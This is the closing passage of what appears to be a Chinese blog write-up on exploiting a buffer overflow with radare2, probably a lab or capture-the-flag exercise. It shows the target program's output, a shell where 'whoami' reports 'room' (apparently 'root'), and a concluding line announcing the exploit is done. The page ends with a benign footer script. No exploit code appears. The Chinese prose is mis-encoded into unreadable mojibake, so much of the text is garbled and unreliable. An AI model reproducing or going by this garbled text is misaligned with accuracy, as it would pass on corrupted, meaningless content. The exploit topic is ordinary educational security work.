    <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Do you have something to say?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
Hello,I<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">m dyf.</span>

QAQ

Do you have something to say<span style="color:#960050;background-color:#1e0010">?</span>
<span style="color:#960050;background-color:#1e0010">$</span> 
</code></pre></div><p>æŒ‰ç…§ä»¥å¾€çš„ä¼ ç»Ÿï¼Œæˆ‘ä»¬éƒ½ä¼šè¾“å…¥ä¸€å¥</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;whoami
room
</code></pre></div><p>é‚£ä¹ˆä¸€æ¬¡åˆ©ç”¨radare2çš„ä¸€æ¬¡ç¼“å†²åŒºæº¢å‡ºæ¼æ´åˆ©ç”¨å°±å®Œæˆäº†ã€‚</p>

</main>

    <footer>
      
<script>
(function() {
  function center_el(tagName) {
    var tags = document.getElementsByTagName(tagName), i, tag;
    for (i = 0; i < tags.length; i++) {
      tag = tags[i];
      var parent = tag.parentElement;
      
      if (parent.childNodes.length === 1) {
        
        if (parent.nodeName === 'A') {
          parent = parent.parentElement;
          if (parent.childNodes.length != 1) continue;
        }
        if (parent.nodeName === 'P') parent.style.textAlign = 'center';
      }
    }
  }
  var tagNames = ['img', 'embed', 'object'];
  for (var i = 0; i < tagNames.length; i++) {
    center_el(tagNames[i]);
  }
})();
</script>

      
      <hr/>
      Open-Source | <a href="https://github.com/goodroot/hugo-classic">Github</a>
      
    </footer>
  </body>
</html>

